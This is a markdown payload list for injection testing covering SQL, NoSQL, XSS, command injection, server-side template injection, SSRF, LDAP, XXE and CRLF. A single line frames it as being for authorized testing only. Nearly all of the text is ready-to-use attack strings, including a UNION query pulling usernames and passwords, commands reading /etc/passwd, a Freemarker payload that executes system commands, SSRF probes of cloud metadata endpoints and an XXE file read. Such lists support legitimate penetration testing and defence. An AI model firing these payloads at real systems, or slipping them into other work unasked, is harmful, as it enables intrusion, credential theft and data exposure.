# Injection Test Payloads

> These payloads are for authorized security testing only.

## SQL Injection

### String-based
```
' OR '1'='1
' OR '1'='1'--
' OR '1'='1'/*
" OR "1"="1
' OR 1=1--
') OR ('1'='1
```

### Union-based
```
' UNION SELECT null--
' UNION SELECT null,null--
' UNION SELECT null,null,null--
' UNION SELECT username,password FROM users--
```

### Error-based
```
' AND 1=CONVERT(int,@@version)--
' AND extractvalue(1,concat(0x7e,version()))--
```

### Blind (Boolean)
```
' AND 1=1--
' AND 1=2--
' AND substring(version(),1,1)='5'--
```

### Blind (Time-based)
```
' AND SLEEP(5)--
' AND pg_sleep(5)--
'; WAITFOR DELAY '0:0:5'--
```

### Numeric context
```
1 OR 1=1
1 AND 1=2
1 UNION SELECT null
```

## NoSQL Injection (MongoDB)

```json
{"$gt": ""}
{"$ne": null}
{"$regex": ".*"}
{"$where": "1==1"}
{"username": {"$regex": "admin"}, "password": {"$ne": ""}}
```

## XSS (Cross-Site Scripting)

### Basic
```html
<script>alert(1)</script>
<script>alert('XSS')</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
```

### Attribute injection
```
" onmouseover="alert(1)
' onfocus='alert(1)' autofocus='
" autofocus onfocus="alert(1)
```

### Event handlers
```html
<img src=x onerror=alert(1)>
<input onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>
<video><source onerror=alert(1)>
```

### Protocol-based
```
javascript:alert(1)
data:text/html,<script>alert(1)</script>
```

### Encoded
```
%3Cscript%3Ealert(1)%3C/script%3E
&#60;script&#62;alert(1)&#60;/script&#62;
\u003cscript\u003ealert(1)\u003c/script\u003e
```

## Command Injection

### Unix
```
; ls -la
| cat /etc/passwd
$(whoami)
`id`
; sleep 5
| sleep 5
$(sleep 5)
```

### Windows
```
& dir
| type C:\Windows\win.ini
$(whoami)
& ping -n 5 127.0.0.1
```

### Bypass attempts
```
;${IFS}ls
;{ls,-la}
$(printf '\x6c\x73')
```

## Template Injection (SSTI)

### Detection
```
{{7*7}}
${7*7}
<%= 7*7 %>
#{7*7}
*{7*7}
```

### Jinja2
```
{{config}}
{{config.items()}}
{{''.__class__.__mro__[2].__subclasses__()}}
```

### Freemarker
```
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
```

## SSRF Payloads

### Internal network
```
http://127.0.0.1
http://localhost
http://0.0.0.0
http://[::1]
http://169.254.169.254/latest/meta-data/ (AWS)
http://metadata.google.internal/ (GCP)
```

### Protocol bypass
```
file:///etc/passwd
gopher://127.0.0.1:25/
dict://127.0.0.1:11211/
```

### IP obfuscation
```
http://2130706433 (decimal for 127.0.0.1)
http://0x7f000001 (hex for 127.0.0.1)
http://017700000001 (octal for 127.0.0.1)
```

## LDAP Injection
```
*
)(cn=*
*)(objectClass=*
*()|&'
admin)(&)
```

## XML/XXE Injection
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

## Header Injection (CRLF)
```
\r\nInjected-Header: value
%0d%0aInjected-Header:%20value
```
